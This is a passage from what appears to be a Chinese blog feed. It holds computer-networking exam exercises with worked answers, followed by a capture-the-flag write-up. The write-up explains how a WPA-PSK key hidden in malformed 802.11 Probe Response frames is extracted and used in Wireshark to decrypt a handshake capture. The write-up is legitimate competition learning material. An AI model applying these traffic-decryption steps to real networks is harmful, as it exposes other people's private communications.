</p><p>S·C=（＋1＋1＋3＋1－1－3－1－1）／8=0， C无发送 </p><p>S·D=（＋1＋1＋3－1＋1＋3＋1－1）／8=1， D发送1</p><p>除此之外，有类似考法如下：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A：0 0 0 1 1 0 1 1</span><br><span class="line">B：0 0 1 0 1 1 1 0</span><br><span class="line">C：0 1 0 1 1 1 0 0</span><br><span class="line">D：0 1 0 0 0 0 1 0</span><br><span class="line">当站点A发送比特1，站点B发送比特0，站点C发送比特1，站点D什么数据也不发送时，总的发送信号是什么？</span><br></pre></td></tr></table></figure><p>解题思路：先将0–&gt;-1，1–&gt;1；再判断是否需要转化该码片序列的二进制反码。若发送比特 0，则发送该码片序列的二进制反码；最后将A、B、C、D竖列相加，即可求出总的发送信号。</p><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当总的信号是（-1 +1 -3 +3 +1 -1 -1 +1）时，且各站点码片序列为</span><br><span class="line">A：0 0 0 1 1 0 1 1</span><br><span class="line">B：0 0 1 0 1 1 1 0</span><br><span class="line">C：0 1 0 1 1 1 0 0</span><br><span class="line">D：0 1 0 0 0 0 1 0</span><br><span class="line">站点A、B、C发送信号是什么？</span><br></pre></td></tr></table></figure><p>解题思路：先将<code>0--&gt;-1</code>，<code>1--&gt;1</code>；然后……</p><h3 id="P109-3-07"><a href="#P109-3-07" class="headerlink" title="P109-3-07"></a><code>P109-3-07</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要发送的数据为1101011011。采用CRC的生成多项式是P（X）=X4+X+1。试求应添加在数据后面的余数。数据在传输过程中最后一个1变成了0，问接收端能否发现？若数据在传输过程中最后两个1都变成了0，问接收端能否发现？采用CRC检验后，数据链路层的传输是否就变成了可靠的传输？</span><br></pre></td></tr></table></figure><p>答：作二进制除法，11010110110000 % 10011 得余数1110 ，添加的检验序列是1110. 作二进制除法，两种错误均可发现，仅仅采用了CRC检验，缺重传机制，数据链路层的传输还不是可靠的传输。<strong>（因为P求出来为10011，一共五位，被除数后面补四个零。）</strong></p><h3 id="P110-3-08"><a href="#P110-3-08" class="headerlink" title="P110-3-08"></a><code>P110-3-08</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要发送的数据为101110。采用CRCD 生成多项式是P（X）=X3+1。试求应添加在数据后面的余数。</span><br></pre></td></tr></table></figure><p>答：作二进制除法，101110 000 % 1001 添加在数据后面的余数是011。</p><h3 id="P110-3-10"><a href="#P110-3-10" class="headerlink" title="P110-3-10"></a><code>P110-3-10</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">试说明10BASE-T中的“10”、“BASE”和“T”所代表的意思。</span><br></pre></td></tr></table></figure><p>答：10BASE-T中的“10”表示信号在电缆上的传输速率为10MB/s，“BASE”表示电缆上 的信号是基带信号，“T”代表双绞线星形网，但10BASE-T的通信距离稍短，每个站到 集线器的距离不超过100m。</p><h3 id="P110-3-18"><a href="#P110-3-18" class="headerlink" title="P110-3-18"></a><code>P110-3-18</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PPP协议使用同步传输技术传送比特串0110111111111100。试问经过零比特填充后变成怎样的比特串？若接收端收到的PPP帧的数据部分是0001110111110111110110，问删除发送端加入的零比特后变成怎样的比特串。</span><br></pre></td></tr></table></figure><p>此题只需记住零比特填充只需”遇到五个1后面补一个0”，故第一小问答案为<code>0110 111110 111110 00</code>。反之，通过原理反推出第二小问的答案<code>000111011111 11111 110</code></p><h3 id="P110-3-20"><a href="#P110-3-20" class="headerlink" title="P110-3-20"></a><code>P110-3-20</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定1KM长的CSMA/CD协议网络的数据率为1Gb/s。设信号在网络上的传播速率为200000KM/S。求能够使用此协议的最短帧长。</span><br></pre></td></tr></table></figure><p>解题：</p><p>对于 <code>1km</code> 电缆，单程传播时间为<code>1KM÷200000KM/s=5us</code>，来回路程传播时间为<code>10us</code>。为了能够按照<a href="https://baike.baidu.com/item/CSMA%2FCD" target="_blank" rel="noopener"><strong>CSMA/CD</strong></a>工作，最小帧的发射时间不能小于<code>10us</code>。以<code>1Gbit/s</code>速率工作，<code>10us</code>可以发送的比特数等于：<code>(10*10^-6)s*(1*10^9)bit/s=10000bit</code>，因此，最短帧是<code>10000</code> 位或 <code>1250</code> 字节长。  </p><p>注意：<code>1s=1000000us</code>、<code>1Mbit/s=10^6bit/s</code>、<code>1Gbit/s=1*10^3Mbit/s=1*10^9bit/s</code>、<code>比特数（时延带宽积）=传播时延*带宽</code>。</p><h3 id="P111-3-27"><a href="#P111-3-27" class="headerlink" title="P111-3-27"></a><code>P111-3-27</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有10个站连接到以太网上，试计算以下三种情况下每一个站所能得到带宽。 </span><br><span class="line">（1）10 个站点连接到一个 10Mbit/s 以太网集线器； </span><br><span class="line">（2）10 站点连接到一个 100Mbit/s 以太网集线器； </span><br><span class="line">（3）10 个站点连接到一个 10Mbit/s 以太网交换机。</span><br></pre></td></tr></table></figure><p>此题只需记住以太网交换机的主要特点： </p><p> 1.以太网交换机的每个端口都直接与主机相连，并且一般都工作在全双工方式。 </p><p> 2.交换机能同时连通许多对的端口，使每一对相互<a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=58051" target="_blank" rel="noopener">通信</a>的主机都能像独占通信媒体那样，进行无冲突地传输数据。 </p><p> 3.共享 <a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8190205" target="_blank" rel="noopener">传输媒体</a>的带宽，对于普通 10 Mb/s 的<a href="http://baike.sogou.com/lemma/ShowInnerLink.htm?lemmaId=8649406" target="_blank" rel="noopener">共享式以太网</a> ，若共有 N 个用户，则每个用户占有的平均带宽只有总带宽(10 Mb/s)的 N 分之一。</p><p>答：</p><p>（1）10 个站共享 10Mbit/s，每个站1Mbit/s。</p><p>（2）10 个站共享 100Mbit/s，每个站10Mbit/s。</p><p>（3）每一个站独占 10Mbit/s。</p><h3 id="P111-3-33"><a href="#P111-3-33" class="headerlink" title="P111-3-33"></a><code>P111-3-33</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">以太网交换机有6个接口,分别接到5台主机和一个路由器,在下面表的动作一栏中,表示先后发送了4个帧.</span><br><span class="line">假定在开始时,以太网交换机的交换表是空的.试把该表中其他的栏目都填写完。如图:</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547039690071.png" alt="1547039690071"></p><p>网上一<a href="http://tieba.baidu.com/p/5107962548?traceid=#106960942164l" target="_blank" rel="noopener">大牛的解题过程</a>，如下</p><p><img src="/2019/01/09/计算机网络期末复习/1547039548223.png" alt="1547039548223"></p><h3 id="P197-4-19"><a href="#P197-4-19" class="headerlink" title="P197-4-19"></a><code>P197-4-19</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">主机A发送IP数据报给主机B,途中经过了5个路由器。试问在IP数据报的发送过程总共使用几次ARP?</span><br></pre></td></tr></table></figure><p>（前提，理论上，当前主机<a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a>arp表中都没有<a href="https://www.baidu.com/s?wd=%E4%B8%8B%E4%B8%80%E8%B7%B3&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">下一跳</a><a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a><a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>）<br>共需6次，主机A先通过arp得到第一个<a href="https://www.baidu.com/s?wd=%E8%B7%AF%E7%94%B1%E5%99%A8&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">路由器</a>的<a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>，之后每一个路由器转发前都通过ARP得到<a href="https://www.baidu.com/s?wd=%E4%B8%8B%E4%B8%80%E8%B7%B3&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">下一跳</a>路由器的<a href="https://www.baidu.com/s?wd=MAC&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">MAC</a>，最后一条路由器将<a href="https://www.baidu.com/s?wd=IP&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao" target="_blank" rel="noopener">IP</a>包发给B前仍要通过ARP得到B的MAC，共6次。</p><h3 id="P197-4-20"><a href="#P197-4-20" class="headerlink" title="P197-4-20"></a><code>P197-4-20</code></h3><p>（1）分组的目的站IP地址为：128.96.39.10。先与子网掩码255.255.255.128相与，得128.96.39.0，可见该分组经接口0转发。 </p><p>（2）分组的目的IP地址为：128.96.40.12。 ① 与子网掩码255.255.255.128相与得128.96.40.0，不等于128.96.39.0。 ② 与子网掩码255.255.255.128相与得128.96.40.0，经查路由表可知，该项分组经R2转发。</p><p> （3）分组的目的IP地址为：128.96.40.151，与子网掩码255.255.255.128相与后得128.96.40.128，与子网掩码255.255.255.192相与后得128.96.40.128，经查路由表知，该分组转发选择默认路由，经R4转发。 </p><p>（4）分组的目的IP地址为：192.4.153.17。与子网掩码255.255.255.128相与后得192.4.153.0。与子网掩码255.255.255.192相与后得192.4.153.0，经查路由表知，该分组经R3转发。 </p><p>（5）分组的目的IP地址为：192.4.153.90，与子网掩码255.255.255.128相与后得192.4.153.0。与子网掩码255.255.255.192相与后得192.4.153.64，经查路由表知，该分组转发选择默认路由，经R4转发。</p><h3 id="P197-4-22"><a href="#P197-4-22" class="headerlink" title="P197-4-22"></a><code>P197-4-22</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个数据报长度为4000字节(固定首部长度,长度为20字节).现在经过一个网络传送,网络能传送的最大数据长度为1500字节.试问应当划分成几个短些的数据报片?各数据报片的数据字段长度,片偏移字段和MF标志应为何值.</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547386988391.png" alt="1547386988391"></p><h3 id="P197-4-26"><a href="#P197-4-26" class="headerlink" title="P197-4-26"></a><code>P197-4-26</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有如下的4个/24地址块，试进行最大可能的聚合。212.56.132.0/24，212.56.133.0/24，212.56.134.0/24，212.56.135.0/24。</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547387643580.png" alt="1547387643580"></p><h3 id="P198-4-28"><a href="#P198-4-28" class="headerlink" title="P198-4-28"></a><code>P198-4-28</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547387849884.png" alt="1547387849884"></p><h3 id="P198-4-29"><a href="#P198-4-29" class="headerlink" title="P198-4-29"></a><code>P198-4-29</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547045867057.png" alt="1547045867057"></p><p><img src="/2019/01/09/计算机网络期末复习/1547045821425.png" alt="1547045821425"></p><h3 id="P199-4-41"><a href="#P199-4-41" class="headerlink" title="P199-4-41"></a><code>P199-4-41</code></h3><p>课本后有答案，记住规则：</p><p>更新算法，收到的报文距离+1<br>如果有新网络，更新，下一跳指向更新源<br>如果已有网络收到更小的距离，更新，下一跳指向更新源<br>如果已有网络收到更大距离，且原有下一跳不是更新源，则不更新<br>如果已有网络收到更大距离，且原有下一跳是更新源，则更新</p><h3 id="P199-4-42"><a href="#P199-4-42" class="headerlink" title="P199-4-42"></a><code>P199-4-42</code></h3><p>课本后有答案，记住规则：</p><p>更新算法，收到的报文距离+1<br>如果有新网络，更新，下一跳指向更新源<br>如果已有网络收到更小的距离，更新，下一跳指向更新源<br>如果已有网络收到更大距离，且原有下一跳不是更新源，则不更新<br>如果已有网络收到更大距离，且原有下一跳是更新源，则更新</p><h3 id="P200-4-55"><a href="#P200-4-55" class="headerlink" title="P200-4-55"></a><code>P200-4-55</code></h3><p><img src="/2019/01/09/计算机网络期末复习/1547045687376.png" alt="1547045687376"></p><p>第一问相对简单，第二问做法将<code>145.13.160.78</code>与四个子网的掩码分别做<code>and</code>运算（这里四个子网掩码都是<code>255.255.192.0</code>），得到<code>and</code>后的网络号，即为该网络号所属子网配置的路由转发的。</p><h3 id="P201-4-64"><a href="#P201-4-64" class="headerlink" title="P201-4-64"></a><code>P201-4-64</code></h3><p>挺简单，自己写下，后面有答案。</p><h3 id="P245-5-21"><a href="#P245-5-21" class="headerlink" title="P245-5-21"></a><code>P245-5-21</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">假定使用连续ARQ协议，发送窗口大小是3，序号范围是[0,15]，二传输媒体保证在接受方能按时收到分组。接收方下一个期望收到的序号是5。试问：</span><br></pre></td></tr></table></figure><p>1、在接受方的发送窗口中可能收到的分组：</p><p>因为到4为止的报文都已经收到，若这些确认全部到达接收方，则WT=[5，7]；若所有的确认都丢失，则WT=[2，4]；若3号确认丢失，则WT=[3，5]；若4号确认丢失，则WT=[4，6]；所以，WT可能是[2，4]，[3，5]，[4，6]，[5，7]中的任何一个。</p><p>2、接收方已经发送的，但在网络中（即还未到达发送方）确认分组可能有2,3,4。因为接受方收到期望序号为5，说明序号2,3,4已经收到，并发送确认，序号1的确认肯定已经被发送方接收了，所以序号2,3,4的分组的确认还可能滞留在网络中。</p><h3 id="P245-5-22"><a href="#P245-5-22" class="headerlink" title="P245-5-22"></a><code>P245-5-22</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主机A向主机B发送一个很长的文件,其长度为L字节。</span><br><span class="line">5—22 主机A向主机B发送一个很长的文件，其长度为L字节。假定TCP使用的MSS有1460字节。</span><br><span class="line">（1） 在TCP的序号不重复使用的条件下，L的最大值是多少？</span><br><span class="line">（2） 假定使用上面计算出文件长度，而运输层、网络层和数据链路层所使用的首部开销共66字节，链路的数据率为10Mb/s，试求这个文件所需的最短发送时间。</span><br></pre></td></tr></table></figure><p><img src="/2019/01/09/计算机网络期末复习/1547124004907.png" alt="1547124004907"></p><h3 id="P245-5-23"><a href="#P245-5-23" class="headerlink" title="P245-5-23"></a><code>P245-5-23</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">主机A向主机B连续发送了两个TCP报文段，其序号分别是70和100。</span><br><span class="line"></span><br><span class="line">试问：</span><br><span class="line"></span><br><span class="line"> (1)第一个报文段携带了多少字节的数据？ </span><br><span class="line"></span><br><span class="line">(2)主机B收到第一个报文段后发回的确认中的确认号应当是多少？ </span><br><span class="line"></span><br><span class="line">(3)主机B收到第二个报文段后发回的确认中的确认号是180，试问A发送的第二个报文段中的数据有多少字节？ </span><br><span class="line"></span><br><span class="line">(4)如果A发送的第一个报文段丢失了，但第二个报文段到达了B。B在第二个报文段到达后向A发送确认。试问这个确认号应为多少？</span><br></pre></td></tr></table></figure><p>确认号是期望收到对方的下一个报文段的数据的第一个字节的序号，也就是期望收到的下一个报文段首部序号字段的值。若确认号=N，则表明：到序号N-1为止的所有数据都已正确收到。(1)第一个报文段携带的数据包括从70字节到第99字节，共携带了30个字节。(2)确认号为100。(3)由于确认号为180，说明到第179号为止的数据都已收到，A发送的第二个报文段中的数据有179-100+1=80字节。(4)由于没有收到A发送的第一个报文段，第二个报文段到达B时将会被丢弃，因此此时收到的报文段的最后一个序号为69。当在第二个报文段到达后一向A发送确认，这个确认号应为70，表示到序号69为止的数据都已收到。</p><h3 id="P246-5-38"><a href="#P246-5-38" class="headerlink" title="P246-5-38"></a><code>P246-5-38</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设TCP的ssthresh（慢开始门限）的初始值为8（单位为报文段）。当拥塞窗口上升到12时网络发生了超时，TCP使用慢开始和拥塞避免。试分别求出第1次到第15次传输的各拥塞窗口大小。你能说明拥塞窗口每一次变化的原因吗？</span><br></pre></td></tr></table></figure><p>（1）慢开始：在主机刚刚开始发送报文段时，可先将拥塞窗口<code>cwnd</code>设置为一个最大报文段<code>MSS</code>的数值。作用：在每收到一个对新的报文段的确认后，将拥塞窗口增加至多一个<code>MSS</code>的数值。用这样的方法逐步增大发送端的拥塞窗口<code>cwnd</code>，可以使分组注入到网络的速率更加合理。</p><p>（2）拥塞避免：当拥塞窗口值大于慢开始门限时，停止使用慢开始算法而改用拥塞避免算法。作用：拥塞避免算法使发送端的拥塞窗口每经过一个往返时延<code>RTT</code>就增加一个<code>MSS</code>的大小。</p><p>（3）当<code>cwnd&lt;ssthresh</code>时，拥塞窗口按指数规律增长；当<code>cwnd&gt;ssthresh</code>时，拥塞窗口按线性规律增长；</p><p>当发生超时时，<code>ssthresh</code>的值更新为发送窗口数值的一半。</p><p>第一轮次拥塞窗口的大小为<code>1</code>，第<code>15</code>轮次的拥塞窗口为<code>9</code>，根据慢开始算法当在第<code>4</code>个时间轮次上升到<code>8</code>时（此时拥塞窗口为<code>8</code>）改为执行拥塞避免算法（加法增大），由已知得当到第<code>8</code>个轮次的时候拥塞窗口为<code>12</code>。此时网络发生了超时，更新后的<code>ssthresh</code>值变为<code>6</code>（发送窗口<code>12</code>的一半）拥塞窗口再重新设置为<code>1</code>，并执行慢开始算法第<code>9</code>个轮次为<code>1</code>，到第<code>12</code>个轮次窗口数变为<code>6</code>开始加法增大到第<code>15</code>个轮次时拥塞窗口为<code>9</code>。</p><h3 id="P247-5-39"><a href="#P247-5-39" class="headerlink" title="P247-5-39"></a><code>P247-5-39</code></h3><p>TCP的拥塞窗口cwnd大小与传输轮次n的关系如下所示：</p><p><img src="/2019/01/09/计算机网络期末复习/1547125514495.png" alt="1547125514495"></p><p>(1)试画出如图所示的拥塞窗口与传输轮次的关系曲线。 </p><p>(2)指明<code>TCP</code>工作在慢开始阶段的时间间隔。</p><p>(3)指明<code>TCP</code>工作在拥塞避免阶段的时间间隔。 </p><p>(4)在第<code>16</code>轮次和第<code>22</code>轮次之后发送方是通过收到三个重复的确认还是通过超时检测到丢失了报文段？</p><p>(5)在第<code>1</code>轮次、第<code>18</code>轮次和第<code>24</code>轮次发送时，门限<code>ssthresh</code>分别被设置为多大？ </p><p>(6)在第几轮次发送出第<code>70</code>个报文段？</p><p>(7)假定在第<code>26</code>轮次之后收到了三个重复的确认，因而检测出了报文段的丢失，那么拥塞窗口<code>cwnd</code>和门限<code>ssthresh</code>应设置为多大？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;期末复习，一起愉快地复习吧！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2019-01-13 基本更新完毕，如有补充，私聊哦~&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="life" scheme="https://jianghuxia.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>护网杯-old Attack题解</title>
    <link href="https://jianghuxia.github.io/2018/11/09/%E6%8A%A4%E7%BD%91%E6%9D%AF-old-Attack%E9%A2%98%E8%A7%A3/"/>
    <id>https://jianghuxia.github.io/2018/11/09/护网杯-old-Attack题解/</id>
    <published>2018-11-09T07:20:50.000Z</published>
    <updated>2018-11-09T07:24:07.232Z</updated>
    
    <content type="html"><![CDATA[<p>经过两个星期左右的学习，深入了一番<code>IEEE 802.11</code>，终于把护网杯那题<code>0</code>解的无线流量题目做出来了，下面分析一番，稍作扩展。</p><a id="more"></a> <h4 id="护网杯-Misc-old-Attack题解"><a href="#护网杯-Misc-old-Attack题解" class="headerlink" title="护网杯-Misc-old Attack题解"></a>护网杯-Misc-old Attack题解</h4><p>题目：<code>Old Attack</code><br><code>The title is hint。:)</code></p><h5 id="题目提示"><a href="#题目提示" class="headerlink" title="题目提示"></a>题目提示</h5><p>提示先后给了三个：</p><p><code>1、Evil AKM Fuzz?</code></p><p><code>2、不规范的802.11 frame</code></p><p><code>3、malformat RSN</code></p><h5 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h5><p><img src="/2018/11/09/护网杯-old-Attack题解/1540960969833.png" alt="1540960969833"></p><h5 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h5><p>先来分析下题目的第一个提示，<code>Evil AKM Fuzz?</code>，<code>AKM</code>是啥呢？这里我网上搜了下，<code>Authentication and Key Management</code>，中文译为<code>“认证和密钥管理”</code>，那按照题目提示的意思是<code>&quot;邪恶AKM攻击&quot;</code>，<code>sorry</code>，这个我真不知道，抱歉啊，学艺不精，找到一个网站介绍<a href="http://www.tech-faq.com/rsn-robust-secure-network.html" target="_blank" rel="noopener">rsn-robust-secure-network</a>，里面有提到<code>Authentication and Key Management</code>。不过，随着解题步骤的展开，好像发现了这个提示的意义，这个后面讲。</p><p>再看看第二个提示，很明显，提示我们可能需要着重分析数据包中不规范的<code>802.11 frame</code>的数据分组。</p><p>最后一个提示，<code>malformat RSN</code>，先介绍下<code>RSN</code> (<code>Robust Secure Network</code>) ，是通过<code>802.11</code>无线网络建立安全通信的协议，这个<code>RSN</code>在<code>802.11 frame</code>的数据分组哪个地方显示呢？翻看我的上一篇文章<a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">一道无线流量题目引发的思考</a>其中的<strong>管理帧中Beacon的具体分析</strong>，里面有个<code>Tag: RSN Information</code> ，然后自己去翻数据分组看看呗。</p><p>知道了这些，我们大概有这么个思路，分析<code>dict.pcapng</code>，找到能够解密<code>huwang.cap</code>握手包的秘钥，这个秘钥对于<code>wireshark</code>解密握手包而言，有三种格式，一种是针对<code>wep</code>的<code>wep</code>格式，另外两种是针对<code>WPA</code>的<code>wpa-pwd</code>和<code>wpa-psk</code>格式。详见下图</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540995564167.png" alt="1540995564167"></p><p>关于上述三种秘钥的填入的<code>Key</code>格式如下：</p><p><code>wep</code>：<code>key</code>的格式是十六进制<code>ASCII</code>码的<code>wifi</code>密码，比如此时<code>wifi</code>密码为<code>123456</code>，那么输入的<code>key</code>应该是<code>31:32:33:34:35</code>。</p><p><code>wpa-pwd</code>:<code>key</code>的格式为“密码:BSSID”，如：路由器名称为<code>T35t</code>，密码为<code>12345678</code>，那么输入的<code>key</code>应该是<code>12345678:T35t</code>。</p><p><code>wpa-psk</code>:通过<code>wireshark</code>提供的<a href="https://www.wireshark.org/tools/wpa-psk.html" target="_blank" rel="noopener">转化网址</a>，只需输入<code>ssid</code>和密码就能将其转化为<code>PSK</code>值，将这个<code>psk</code>值即是填入的<code>key</code>值（这个详细操作也可以查看我的上一篇文章<a href="https://www.anquanke.com/post/id/162546" target="_blank" rel="noopener">一道无线流量题目引发的思考</a>，里面也提到另外一种通过<code>airdecap-ng</code>工具解密的方法）。</p><p>额，这里不妨先透露个题解的步骤，此题就是通过最后一种格式<code>wpa-psk</code>对<code>huwang.cap</code>进行解密的，而在这里，知道<code>psk</code>值格式是固定的<code>64</code>位是其中解题的关键。</p><h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><h6 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h6><p>打开数据包<code>dict.pcapng</code>，简单分析，会发现存在大量的<code>Beacon</code>数据分组，都为畸形数据分组，并且<code>SSID</code>为大量非常见字符。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540961199789.png" alt="1540961199789"></p><p>往下随意滑动，至中部，会发现依旧为畸形数据分组，但<code>SSID</code>变为了长度均为<code>64</code>位的字符串。（到这里，可能有师傅已经明白解题的关键步骤了）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540961390093.png" alt="1540961390093"></p><p>比赛做到这里，卡住了，因为那时不知道如何过滤不同类型帧的语句。比赛结束后，尝试了许久，实在没想通接下去的思路。就试着过滤各种<code>802.11</code>类型帧的数据包。然后，奇迹来了。当我试着执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>过滤管理帧中类型为<code>Probe Response</code>的数据分组时，发现了下面两个分组，这引起了我的注意。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540699047641.png" alt="1540699047641"></p><p>过滤之后，可以看到这两个畸形帧<code>SSID</code>的值均为<code>e392618fbd761a9467e64f2aaebeb0c40cfad70d1ab323dbe0741bf3fdc475a4</code>。（正好这个时候，出题老哥接受了我的好友申请，我就把自己到这步的思路跟老哥说，老哥有点惊讶”对，就是这个，你是怎么找到的?” “额，直接执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>找到的”）。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540699096822.png" alt="1540699096822"></p><p>随后我认真的分析了下这两个数据分组，发现并不完全符合题目中两个提示的要求，这是两个<code>不规范的802.11 frame</code>，但是并不存在<code>malformat RSN</code>的数据呀。这里刚开始以为提示错了，因为按照下图所显示的，只是存在<code>ssid</code>的<code>tag</code>标签<code>Group为Malformed</code>，后面跟着的是正常的<code>Tag:RSN Information</code>的标签。（后来返回去思考，发现是自己错了，这个后面再详细解释）。额，下面这个图有个描述有错，“被”应该改为“并”。</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1541035369849.png" alt="1541035369849"></p><p>但是这两个畸形帧中<code>SSID</code>的长度为<code>64</code>，注意是<code>64</code>！，并且整个数据包里只有这两条<code>Probe Response</code>此类型 5447565467帧的数据分组，你说可不可疑=</p><p>如果懂得<code>wpa-psk</code>解密的<code>key</code>的固定格式为<code>64</code>位，那么自然而然，就会想着把这个长度<code>64</code>位的字符串尝试地去进行握手包<code>huwang.cap</code>的解密，但是那个时候并不清楚这些。也就是为什么上面讲到“<strong>知道<code>psk</code>值格式是固定的<code>64</code>位是其中的关键</strong>”。（当时的我以为还是在<code>dict.pcapng</code>中找到密码，然后使用<code>aircrack-ng</code>爆破<code>huwang.cap</code>的密码，再使用验证正确的密码去解密握手包，再接着分析，所以在这里，你可能不敢相信，我把这<code>64</code>位的字符串，按每隔八位拆分，去尝试爆破出正确的密码，那时太天真了）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540998207844.png" alt="1540998207844"></p><p>顺着刚刚的思路，打开<code>wireshark</code>，依次按照步骤操作：编辑 -&gt; 首选项 -&gt; <code>Protocols</code> -&gt; <code>IEEE 802.11</code> ，点击<code>Edit</code>，选填<code>wpa-psk</code>，输入刚刚得到的<code>PSK</code>值（那个<code>64</code>位的字符串），进行解密。（说来你可能不敢相信，那是一个慵懒的早上，我躺在床上情不自禁地想着那串<code>64</code>位长度的字符串到底是怎样能解开握手包时。突然意识到这个<code>64</code>字符串有可能是通过<code>wpa-psk</code>解密时所需要的<code>key</code>值，越想越可能，没想到还真是。这种感觉贼虚服，不知道老哥们有没有这种感觉，只可意会，不可言传。）</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540736974189.png" alt="1540736974189"></p><p>再次分析<code>huwang.cap</code>，发现上层数据均已显现出来。分析<code>http</code>，发现一个<code>/djuds8RS/1.txt</code>的访问路径</p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540735875613.png" alt="1540735875613"></p><p>尝试访问，打开<code>http://www.wiattack.net/djuds8RS/1.txt</code>，得到<code>flag</code></p><p><img src="/2018/11/09/护网杯-old-Attack题解/1540690130188.png" alt="1540690130188"></p><h6 id="非预期原因"><a href="#非预期原因" class="headerlink" title="非预期原因"></a>非预期原因</h6><p>关于此题，可能由于环境部署的难度原因，出题老哥忘记做<code>Probe Response</code>此类型帧的混淆了，使得执行过滤语句<code>wlan.fc.type_subtype == 0x0005</code>就可以过滤出类型为<code>Probe Response</code>，且最为可疑<code>malformat RSN</code>数据分组中存在的畸形字长为<code>64</code>位的字符串，然后使用<code>wpa-psk</code>解密方式解密握手包<code>huwang.cap</code>，再分析解密后显现出的<code>http</code>流，即可得到最终的答案。</p><h6 